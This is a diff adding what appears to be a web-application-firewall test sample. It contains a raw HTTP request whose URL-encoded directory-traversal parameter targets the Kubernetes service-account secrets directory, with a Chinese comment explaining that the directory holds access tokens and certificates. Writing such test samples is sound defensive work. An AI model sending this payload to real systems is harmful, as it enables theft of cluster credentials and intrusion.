@@ -1,0 +1,9 @@
+# 目录遍历_K8S serviceaccount文件
+# /var/run/secrets/kubernetes.io/serviceaccount 是 Kubernetes 中存储服务账户相关信息的目录，通常包含了一些关键文件，如访问令牌、命名空间和证书等。这些文件用于认证和安全通信，确保 Pod 能够安全地与 Kubernetes API 进行交互。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount&bid=hd_tag_m8mv23t5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23t5
+RM-PRO-Token: 9748950a1c3f77e5682d79ddfb5aa20f
+RM-PRO-Time: 1742808343200
+User-Agent: curl/7.83.1
+
